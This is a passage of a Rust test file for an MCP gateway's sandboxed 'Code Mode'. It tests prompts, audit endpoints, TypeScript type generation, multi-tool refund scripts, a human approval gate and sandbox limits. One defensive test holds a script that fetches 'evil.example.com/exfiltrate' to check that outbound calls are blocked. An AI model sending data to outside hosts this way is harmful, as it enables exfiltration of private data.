    let res_read_req = RPCRequest::new(
        3004i64,
        "resources/read",
        json!({"uri": "omni://audit/merkle-head"}),
    );
    let res_read_resp = omni.handle_request(&res_read_req, "agent", None);
    assert!(res_read_resp.error.is_none());
    let res_contents = res_read_resp.result.unwrap()["contents"].as_array().unwrap().clone();
    assert_eq!(res_contents[0]["uri"].as_str(), Some("omni://audit/merkle-head"));

    // 4. Test MCP Prompts list and get
    let prompt_list_req = RPCRequest::new(3005i64, "prompts/list", json!({}));
    let prompt_list_resp = omni.handle_request(&prompt_list_req, "agent", None);
    assert!(prompt_list_resp.error.is_none());
    let prompts = prompt_list_resp.result.unwrap()["prompts"].as_array().unwrap().clone();
    assert!(prompts.iter().any(|p| p["name"].as_str() == Some("incident-investigation")));

    let prompt_get_req = RPCRequest::new(
        3006i64,
        "prompts/get",
        json!({
            "name": "incident-investigation",
            "arguments": {"service_name": "driverdispatchservice"}
        }),
    );
    let prompt_get_resp = omni.handle_request(&prompt_get_req, "agent", None);
    assert!(prompt_get_resp.error.is_none());

    // 5. Test HTTP SSE and Tracing / Audit endpoints
    let headers = HashMap::new();
    let (sse_status, sse_ctype, _sse_headers, sse_body) = ctx.handle_http("GET", "/sse", &headers, &[]);
    assert_eq!(sse_status, 200);
    assert!(sse_ctype.contains("text/event-stream"));
    assert!(String::from_utf8(sse_body).unwrap().contains("event: endpoint"));

    let (traces_status, _, _, traces_body) = ctx.handle_http("GET", "/api/traces", &headers, &[]);
    assert_eq!(traces_status, 200);
    let traces_json = JsonValue::parse(&String::from_utf8(traces_body).unwrap()).unwrap();
    assert!(traces_json.get("spans").is_some());

    let (audit_status, _, _, audit_body) = ctx.handle_http("GET", "/api/audit/verify", &headers, &[]);
    assert_eq!(audit_status, 200);
    let audit_json = JsonValue::parse(&String::from_utf8(audit_body).unwrap()).unwrap();
    assert_eq!(audit_json["verified"].as_bool(), Some(true));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_codemode_typescript_declaration_generation_and_token_compression() {
    let dir = temp_test_path("omni_codemode_types_test");
    let mut cfg = OmniConfig::default();
    cfg.data_dir = dir.clone();
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // 1. Generate TypeScript declarations across all enabled servers
    let ts_res = ctx.gateway.generate_codemode_types(None, None);
    assert!(ts_res.typescript_declarations.contains("declare namespace codemode {"));
    assert!(ts_res.typescript_declarations.contains("namespace uber_rides {"));
    assert!(ts_res.typescript_declarations.contains("function list_recent(input: { user_id: string }): Promise<any>;"));
    assert!(ts_res.typescript_declarations.contains("namespace accounting {"));
    assert!(ts_res.typescript_declarations.contains("[MUTATION]"));
    assert!(ts_res.typescript_declarations.contains("function refund("));
    assert!(ts_res.token_savings_pct > 50.0);

    // 2. Test {{types}} prompt template injection
    let template = "Use the following TypeScript APIs:\n```ts\n{{types}}\n```";
    let injected = CodeModeTypeGenerator::inject_types_template(template, &ts_res.typescript_declarations);
    assert!(injected.contains("declare namespace codemode"));
    assert!(!injected.contains("{{types}}"));

    // 3. Verify `tools/list` on OmniMCPServer dynamically injects {{types}} into `codemode` description
    let list_req = RPCRequest::new(4001i64, "tools/list", json!({}));
    let list_resp = ctx.omni_mcp.handle_request(&list_req, "agent", None);
    let tools = list_resp.result.unwrap()["tools"].as_array().unwrap().clone();
    let codemode_tool = tools
        .iter()
        .find(|t| t["name"].as_str() == Some("codemode"))
        .expect("codemode tool must be exposed");
    assert!(codemode_tool["description"]
        .as_str()
        .unwrap()
        .contains("declare namespace codemode"));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_codemode_js_ts_and_rhai_multi_tool_chaining_with_console_logs() {
    let dir = temp_test_path("omni_codemode_exec_test");
    let mut cfg = OmniConfig::default();
    cfg.data_dir = dir.clone();
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // 1. Omni Code Mode JS/TS async script with console.log and multi-tool chaining
    let js_script = r#"
    async () => {
        const rides = await codemode.uber_rides.list_recent({ user_id: "usr_456" });
        console.log("Fetched rides:", rides.length);
        const eligible = rides.filter(r => r.status === "cancelled" && r.amount > 20.0);
        let total_refund = 0.0;
        let count = 0;
        for (const ride of eligible) {
            await codemode.accounting.refund({ ride_id: ride.id, reason: "Auto refund via Code Mode" });
            console.log("Refunded ride:", ride.id);
            total_refund += ride.amount;
            count += 1;
        }
        return { refunded_count: count, total_amount: total_refund };
    }
    "#;

    let out_js = ctx.gateway.execute_codemode(
        js_script,
        None,
        false,
        "agent",
        Some("uber_token_1"),
        None,
    );
    assert_eq!(out_js.status, "OK", "JS error: {:?}", out_js.error);
    assert_eq!(out_js.result["refunded_count"].as_i64(), Some(2));
    assert_eq!(out_js.result["total_amount"].as_f64(), Some(72.5));
    assert_eq!(out_js.tool_calls, 3);
    assert_eq!(out_js.logs.len(), 3);
    assert!(out_js.logs[0].contains("Fetched rides: 4"));
    assert!(out_js.logs[1].contains("Refunded ride: ride_102"));
    assert!((out_js.boot_parse_us + out_js.eval_us) < 20_000); // Fast in-process execution

    // 2. Rust/Rhai syntax equivalent
    let rhai_script = r#"
    let rides = uber_rides::list_recent("usr_456");
    let total_refund = 0.0;
    let count = 0;
    for ride in rides {
        if ride.status == "cancelled" && ride.amount > 20.0 {
            accounting::refund(ride.id, "Auto refund via agent");
            total_refund += ride.amount;
            count += 1;
        }
    }
    #{ refunded_count: count, total_amount: total_refund }
    "#;

    let out_rhai = ctx.gateway.execute_codemode(
        rhai_script,
        None,
        false,
        "agent",
        Some("uber_token_1"),
        None,
    );
    assert_eq!(out_rhai.status, "OK", "Rhai error: {:?}", out_rhai.error);
    assert_eq!(out_rhai.result["refunded_count"].as_i64(), Some(2));
    assert_eq!(out_rhai.result["total_amount"].as_f64(), Some(72.5));

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_codemode_search_and_execute_plus_mutation_approval_gate() {
    let dir = temp_test_path("omni_codemode_approval_test");
    let mut cfg = OmniConfig::default();
    cfg.data_dir = dir.clone();
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // 1. In-sandbox `codemode.search()` and `codemode.describe()` (Search & Execute pattern)
    let search_script = r#"
    async () => {
        const matches = await codemode.search("refund");
        const dts = await codemode.describe("accounting");
        return { match_count: matches.length, has_dts: dts.includes("function refund") };
    }
    "#;
    let search_out = ctx.gateway.execute_codemode(search_script, None, false, "agent", None, None);
    assert_eq!(search_out.status, "OK");
    assert!(search_out.result["match_count"].as_i64().unwrap_or(0) >= 1);
    assert_eq!(search_out.result["has_dts"].as_bool(), Some(true));

    // 2. Human-in-the-loop Mutation Approval Gate (`require_mutation_approval: true`)
    let mut_script = r#"
    async () => {
        const rides = await codemode.uber_rides.list_recent({ user_id: "usr_456" });
        console.log("Loaded rides before mutation");
        await codemode.accounting.refund({ ride_id: rides[1].id, reason: "Needs human approval" });
        return { done: true };
    }
    "#;
    let approval_out = ctx.gateway.execute_codemode(
        mut_script,
        None,
        true, // require_mutation_approval = true
        "agent",
        None,
        None,
    );
    assert_eq!(approval_out.status, "APPROVAL_REQUIRED");
    assert_eq!(approval_out.logs.len(), 1);
    assert_eq!(approval_out.pending_approvals.len(), 1);
    assert_eq!(approval_out.pending_approvals[0].server_name, "accounting");
    assert_eq!(approval_out.pending_approvals[0].tool_name, "refund");

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}

#[test]
fn test_v4_codemode_zero_outbound_isolation_and_fuel_guardrails() {
    let dir = temp_test_path("omni_codemode_security_test");
    let mut cfg = OmniConfig::default();
    cfg.data_dir = dir.clone();
    let ctx = ProductionGatewayContext::new(Some(cfg));

    // 1. Verify `globalOutbound: null` blocks direct `fetch()`
    let outbound_script = r#"
    async () => {
        const res = await fetch("https://evil.example.com/exfiltrate");
        return res;
    }
    "#;
    let out_blocked = ctx.gateway.execute_codemode(outbound_script, None, false, "agent", None, None);
    assert_eq!(out_blocked.status, "ERROR");
    assert!(out_blocked
        .error
        .as_deref()
        .unwrap_or("")
        .contains("GlobalOutboundBlocked"));

    // 2. Verify Fuel Metering terminates infinite loops (`while (true) {}`) deterministically
    let mut strict_limits = SandboxLimits::default();
    strict_limits.max_operations = 500;
    let inf_loop = r#"
    let i = 0;
    while (true) {
        i += 1;
    }
    "#;
    let out_fuel = ctx.gateway.execute_codemode(
        inf_loop,
        Some(strict_limits),
        false,
        "agent",
        None,
        None,
    );
    assert_eq!(out_fuel.status, "ERROR");
    assert!(out_fuel
        .error
        .as_deref()
        .unwrap_or("")
        .contains("FuelExhausted"));

    // 3. Verify SHA-256 Merkle Audit Chain recorded all Code Mode executions
    let (verified, count) = ctx.audit_store.verify_chain();
    assert!(verified);
    assert!(count >= 2);

    ctx.store.close();
    let _ = fs::remove_dir_all(&dir);
}
